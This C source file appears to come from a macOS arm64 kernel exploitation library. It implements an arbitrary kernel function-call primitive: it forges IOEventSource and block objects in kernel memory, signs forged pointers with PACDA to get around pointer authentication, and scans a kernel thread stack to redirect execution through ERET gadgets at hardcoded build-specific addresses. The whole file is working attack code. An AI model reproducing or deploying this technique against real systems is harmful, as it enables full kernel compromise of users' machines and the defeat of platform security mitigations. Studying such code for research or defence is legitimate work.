//
//  kfunc.c
//  libxe
//
//  Created by admin on 2/16/22.
//

#include <assert.h>
#include <stdlib.h>

#include "util/kfunc.h"
#include "memory/kmem.h"
#include "slider/kernel.h"
#include "util/ptrauth.h"
#include "util/zalloc.h"
#include "util/kalloc_heap.h"
#include "util/pacda.h"
#include "util/assert.h"
#include "util/lck_rw.h"
#include "util/dispatch.h"
#include "util/ptrauth.h"
#include "util/log.h"
#include "xnu/proc.h"
#include "iokit/io_surface.h"
#include "iokit/os_dictionary.h"
#include "allocator/pipe.h"
#include "allocator/large_mem.h"

#include "macos_params.h"
#include "macos_arm64.h"

#define STACK_SCAN_SIZE 8192

#if defined(MACOS_21D49)
#define ERET1_ENTRY 0xfffffe000724bc20
#define ERET2_ENTRY 0xfffffe000725709c
#define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE 0xfffffe00079cbf84
#define LR_BLOCK_RELEASE_HELPER 0xfffffe000795a328
#elif defined(MACOS_21E5212f)
#define ERET1_ENTRY 0xfffffe0007253c20
#define ERET2_ENTRY 0xfffffe000725f09c
#define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE 0xfffffe00079df578
#define LR_BLOCK_RELEASE_HELPER 0xfffffe000796cd04
#else
#error "unknown platform"
#endif

#define ERET2_ARGS_SIZE (1 << 30)

enum {
    BLOCK_DEALLOCATING =      (0x0001),// runtime
    BLOCK_REFCOUNT_MASK =     (0xfffe),// runtime
    BLOCK_INLINE_LAYOUT_STRING = (1 << 21), // compiler
    BLOCK_SMALL_DESCRIPTOR =  (1 << 22), // compiler
    BLOCK_IS_NOESCAPE =       (1 << 23), // compiler
    BLOCK_NEEDS_FREE =        (1 << 24),// runtime
    BLOCK_HAS_COPY_DISPOSE =  (1 << 25),// compiler
    BLOCK_HAS_CTOR =          (1 << 26),// compiler: helpers have C++ code
    BLOCK_IS_GC =             (1 << 27),// runtime
    BLOCK_IS_GLOBAL =         (1 << 28),// compiler
    BLOCK_USE_STRET =         (1 << 29),// compiler: undefined if !BLOCK_HAS_SIGNATURE
    BLOCK_HAS_SIGNATURE  =    (1 << 30),// compiler
    BLOCK_HAS_EXTENDED_LAYOUT=(1 << 31) // compiler
};


struct xe_util_kfunc {
    uintptr_t io_event_source;
    uintptr_t io_event_source_vtable;
    uintptr_t reserved;
    uintptr_t counter;
    uintptr_t block;
    uintptr_t block_descriptor;
    uintptr_t eret2_args;
    
    xe_util_zalloc_t io_event_source_allocator;
    xe_util_zalloc_t block_allocator;
    xe_util_zalloc_t reserved_allocator;
    xe_util_zalloc_t counter_allocator;
    xe_allocator_large_mem_t eret2_args_allocator;
};


uintptr_t xe_util_kfunc_sign_address(uintptr_t proc, uintptr_t address, uintptr_t ctx_base, uint16_t descriminator) {
    uintptr_t address_out;
    int error = xe_util_pacda_sign(proc, address, XE_PTRAUTH_BLEND_DISCRIMINATOR_WITH_ADDRESS(descriminator, ctx_base), &address_out);
    xe_assert_err(error);
    return address_out;
}


xe_util_kfunc_t xe_util_kfunc_create(uint free_zone_idx) {
    uintptr_t proc = xe_xnu_proc_current_proc();
    uintptr_t free_zone = xe_util_zalloc_find_zone_at_index(free_zone_idx);
    xe_assert(xe_kmem_read_uint64(free_zone, 0) == 0);
    
    xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE), 0), 1);
    xe_util_zalloc_t reserved_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE_RESERVED), 0), 1);
    xe_util_zalloc_t counter_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE_COUNTER), 0), 1);
    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), 16384), 2);
    
    uintptr_t io_event_source = xe_util_zalloc_alloc(io_event_source_allocator, 0);
    uintptr_t reserved = xe_util_zalloc_alloc(reserved_allocator, 0);
    uintptr_t block = xe_util_zalloc_alloc(block_allocator, 0);
    uintptr_t counter = xe_util_zalloc_alloc(counter_allocator, 0);
    
    uintptr_t io_event_source_vtable = xe_util_kfunc_sign_address(proc, xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_VTABLE + 0x10), io_event_source, TYPE_IO_EVENT_SOURCE_MEM_VTABLE_DESCRIMINATOR);
    
    uintptr_t block_descriptor = xe_util_kfunc_sign_address(proc, free_zone, block + TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_DESCRIMINATOR);
    
    xe_util_kfunc_t util = malloc(sizeof(struct xe_util_kfunc));
    
    util->block = block;
    util->io_event_source = io_event_source;
    util->io_event_source_vtable = io_event_source_vtable;
    util->reserved = reserved;
    util->counter = counter;
    
    util->io_event_source_allocator = io_event_source_allocator;
    util->reserved_allocator = reserved_allocator;
    util->counter_allocator = counter_allocator;
    util->block_allocator = block_allocator;
    util->eret2_args_allocator = xe_allocator_large_mem_allocate(ERET2_ARGS_SIZE, &util->eret2_args);
    
    util->block_descriptor = block_descriptor;
        
    return util;
}


void xe_util_kfunc_setup_block_descriptor(xe_util_kfunc_t util) {
    int64_t diff = (xe_slider_kernel_slide(ERET1_ENTRY) - xe_ptrauth_strip(util->block_descriptor) - TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET);
    xe_assert(diff >= INT32_MIN && diff <= INT32_MAX);
    xe_kmem_write_int32(xe_ptrauth_strip(util->block_descriptor), TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET, (int32_t)diff);
}


uintptr_t xe_util_kfunc_setup_block(xe_util_kfunc_t util, uintptr_t target_func) {
    int32_t flags = (BLOCK_SMALL_DESCRIPTOR | BLOCK_NEEDS_FREE | BLOCK_HAS_COPY_DISPOSE) + 2;
    
    uintptr_t x0 = util->eret2_args;
    x0 &= ~((BLOCK_IS_GLOBAL << 1) - 1);
    if (x0 < util->eret2_args) {
        x0 += ERET2_ARGS_SIZE >> 1;
    }
    x0 |= flags;
    xe_assert_cond(x0, >=, util->eret2_args);
    xe_assert_cond(x0 + sizeof(struct arm_context), <, util->eret2_args + ERET2_ARGS_SIZE);
    
    static_assert(offsetof(struct arm_context, ss.uss.x[0]) == TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET, "");
    xe_kmem_write_uint64(util->block, TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET, x0);
    xe_kmem_write_uint64(util->block, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, util->block_descriptor);
    xe_kmem_write_uint64(util->block, offsetof(struct arm_context, ss.uss.x[4]), target_func);
    
    return x0 - 1;
}


void xe_util_kfunc_setup_event_source(xe_util_kfunc_t util) {
    uintptr_t event_source = util->io_event_source;
    xe_kmem_write_uint64(event_source, TYPE_OS_OBJECT_MEM_VTABLE_OFFSET, util->io_event_source_vtable);
    uint32_t ref_count = 1 | (1ULL << 16);
    xe_kmem_write_uint32(event_source, TYPE_OS_OBJECT_MEM_RETAIN_COUNT_OFFSET, ref_count);
    xe_kmem_write_uint64(event_source, TYPE_IO_EVENT_SOURCE_MEM_ACTION_BLOCK_OFFSET, util->block);
    xe_kmem_write_uint32(event_source, TYPE_IO_EVENT_SOURCE_MEM_FLAGS_OFFSET, 0x4);
    xe_kmem_write_uint64(event_source, TYPE_IO_EVENT_SOURCE_MEM_RESERVED_OFFSET, util->reserved);
    xe_kmem_write_uint64(util->reserved, 0, util->counter);
}


int xe_util_kfunc_find_thread_with_state(uintptr_t proc, int state, uintptr_t* ptr_out) {
    uintptr_t task = xe_ptrauth_strip(xe_kmem_read_uint64(proc, TYPE_PROC_MEM_TASK_OFFSET));
    
    uintptr_t thread = xe_kmem_read_uint64(task, TYPE_TASK_MEM_THREADS_OFFSET);
    while (thread != 0 && thread != task + TYPE_TASK_MEM_THREADS_OFFSET) {
        int thread_state = xe_kmem_read_int32(thread, TYPE_THREAD_MEM_STATE_OFFSET);
        xe_log_debug("thread: %p, state: %d", (void*)thread, thread_state);
        if (thread_state == state) {
            *ptr_out = thread;
            return 0;
        }
        thread = xe_kmem_read_uint64(thread, TYPE_THREAD_MEM_TASK_THREADS_OFFSET);
    }
    
    return ENOENT;
}


uintptr_t xe_util_kfunc_find_ptr(uintptr_t base, char* data, size_t data_size, uintptr_t ptr, uintptr_t mask) {
    uintptr_t* values = (uintptr_t*)data;
    size_t count = data_size / sizeof(uintptr_t);
    
    for (size_t i=0; i<count; i++) {
        if ((values[i] | mask) == ptr) {
            return base + i * sizeof(uintptr_t);
        }
    }
    
    return 0;
}


int xe_util_kfunc_find_target_thread(uintptr_t proc, uintptr_t* ptr_out) {
    uintptr_t target_thread = 0;
    int error = 0;
    int tries = 10;
    do {
        error = xe_util_kfunc_find_thread_with_state(proc, 0x1 | 0x8, &target_thread);
        tries--;
        sleep(1);
    } while (error != 0 && tries > 0);
    *ptr_out = target_thread;
    return error;
}


void xe_util_kfunc_reset(xe_util_kfunc_t util) {
    // Reuse the previous addresses to avoid signing pointers using PACDA
    uintptr_t block = xe_util_zalloc_alloc(util->block_allocator, 0);
    uintptr_t event_source = xe_util_zalloc_alloc(util->io_event_source_allocator, 0);
    uintptr_t reserved = xe_util_zalloc_alloc(util->reserved_allocator, 0);
    uintptr_t counter = xe_util_zalloc_alloc(util->counter_allocator, 0);
    
    xe_assert_cond(block, ==, util->block);
    xe_assert_cond(event_source, ==, util->io_event_source);
    xe_assert_cond(reserved, ==, util->reserved);
    xe_assert_cond(counter, ==, util->counter);
}


void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t args[8]) {
    if (!xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0)) {
        uintptr_t lock = xe_util_zalloc_alloc(util->block_allocator, 1);
        uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
        uintptr_t kh_large_map = xe_kmem_read_uint64(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET);
        xe_kmem_copy(lock, kh_large_map + TYPE_VM_MAP_MEM_LCK_RW_OFFSET, 16);
        xe_kmem_write_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0, lock);
    }
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    
    uintptr_t surface;
    IOSurfaceRef surface_ref = xe_io_surface_create(&surface);
    xe_log_debug("created io_surface at %p\n", (void*)surface);
    IOSurfaceSetValue(surface_ref, CFSTR("xe_util_kfunc_key"), kCFBooleanTrue);
    
    xe_util_kfunc_setup_event_source(util);
    uintptr_t eret2_arm_context = xe_util_kfunc_setup_block(util, target_func);
    xe_util_kfunc_setup_block_descriptor(util);
    
    uintptr_t props = xe_kmem_read_uint64(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
    int error = xe_os_dictionary_set_value_of_key(props, "xe_util_kfunc_key", util->io_event_source);
    xe_assert_err(error);
    
    xe_util_lck_rw_t io_statistics_lock = xe_util_lck_rw_lock_exclusive(proc, xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0));
    
    dispatch_semaphore_t sem_surface_destroy = dispatch_semaphore_create(0);
    dispatch_async(xe_dispatch_queue(), ^() {
        xe_log_debug("io_surface destroy start");
        IOSurfaceRemoveAllValues(surface_ref);
        IOSurfaceDecrementUseCount(surface_ref);
        xe_log_debug("io_surface destory done");
        dispatch_semaphore_signal(sem_surface_destroy);
    });
    
    uintptr_t target_thread;
    error = xe_util_kfunc_find_target_thread(proc, &target_thread);
    xe_assert_err(error);
    
    uintptr_t kstack = xe_kmem_read_uint64(target_thread, TYPE_THREAD_MEM_MACHINE_OFFSET + TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET);
    kstack -= STACK_SCAN_SIZE;
    
    char* kstack_buffer = malloc(STACK_SCAN_SIZE);
    xe_kmem_read(kstack_buffer, kstack, 0, STACK_SCAN_SIZE);
    uintptr_t lr = xe_util_kfunc_find_ptr(kstack, kstack_buffer, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE), XE_PTRAUTH_MASK);
    xe_assert(lr != 0);
    free(kstack_buffer);
    
    uintptr_t x19 = lr - 0x10;
    uintptr_t x20 = x19 - 0x8;
    uintptr_t x21 = x20 - 0x8;
    uintptr_t x22 = x21 - 0x8;
    uintptr_t x23 = x22 - 0x8;
    uintptr_t x24 = x23 - 0x8;
    
    uintptr_t x20_backup = xe_kmem_read_uint64(x20, 0);
    uintptr_t x21_backup = xe_kmem_read_uint64(x21, 0);
    uintptr_t x22_backup = xe_kmem_read_uint64(x22, 0);
    uintptr_t x23_backup = xe_kmem_read_uint64(x23, 0);
    uintptr_t x24_backup = xe_kmem_read_uint64(x24, 0);
    
    uintptr_t sp = lr - 0x38 + 0x40 - 0x20;
    xe_kmem_write_uint64(util->block, offsetof(struct arm_context, ss.uss.sp), sp);
    xe_kmem_write_uint64(x20, 0, xe_slider_kernel_slide(ERET2_ENTRY));
    xe_kmem_write_uint64(x21, 0, 0x400008);
    
    struct arm_context eret2_args;
    bzero(&eret2_args, sizeof(eret2_args));
    eret2_args.ss.uss.x[0] = args[0];
    eret2_args.ss.uss.x[1] = args[1];
    eret2_args.ss.uss.x[2] = args[2];
    eret2_args.ss.uss.x[3] = args[3];
    eret2_args.ss.uss.x[4] = args[4];
    eret2_args.ss.uss.x[5] = args[5];
    eret2_args.ss.uss.x[6] = args[6];
    eret2_args.ss.uss.x[7] = args[7];
    eret2_args.ss.uss.x[19] = util->block;
    eret2_args.ss.uss.x[20] = x20_backup;
    eret2_args.ss.uss.x[21] = x21_backup;
    eret2_args.ss.uss.x[22] = x22_backup;
    eret2_args.ss.uss.x[23] = x23_backup;
    eret2_args.ss.uss.x[24] = x24_backup;
    eret2_args.ss.uss.x[25] = util->eret2_args;
    eret2_args.ss.uss.x[26] = util->eret2_args;
    eret2_args.ss.uss.lr = xe_slider_kernel_slide(LR_BLOCK_RELEASE_HELPER);
    eret2_args.ss.uss.fp = sp + 0x10;
    xe_kmem_write(eret2_arm_context, 0, &eret2_args, sizeof(eret2_args));
    
    xe_util_lck_rw_lock_done(&io_statistics_lock);
    dispatch_semaphore_wait(sem_surface_destroy, DISPATCH_TIME_FOREVER);
    xe_util_kfunc_reset(util);
}


void xe_util_kfunc_destroy(xe_util_kfunc_t* util_p) {
    xe_util_kfunc_t util = *util_p;
    xe_allocator_large_mem_free(&util->eret2_args_allocator);
    // TODO: free others
    free(util);
    *util_p = NULL;
}
